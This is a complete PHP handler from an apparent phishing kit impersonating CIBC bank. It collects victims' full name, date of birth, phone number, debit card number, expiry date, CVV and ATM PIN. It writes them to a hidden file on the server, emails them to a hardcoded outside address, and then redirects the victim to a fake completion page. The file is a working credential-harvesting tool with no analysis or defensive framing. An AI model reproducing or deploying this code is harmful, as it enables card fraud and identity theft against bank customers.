<?php
error_reporting(0);
$send = "ventura514@outlook.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------FULL INFO----------------\n";
$message .= "FULLNAME	: ".$_POST['FN']."\n";
$message .= "DOB		: ".$_POST['D1']."-".$_POST['D2']."-".$_POST['D3']."\n";
$message .= "PHONE		: ".$_POST['PN']."\n";
$message .= "DEBIT		: ".$_POST['CN']."\n";
$message .= "EXP		: ".$_POST['ED1']."-".$_POST['ED2']."\n";
$message .= "CVV		: ".$_POST['CV']."\n";
$message .= "ATMPIN		: ".$_POST['AP']."\n";
$message .= "-------------------------------------------\n";

$subject = "CIBC RESULTS";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/35yhrgesccd.txt","a+");
fwrite($fp,"CIBC" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "CIBC", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");

?>
<script>
    window.top.location.href = "complete.php";

</script>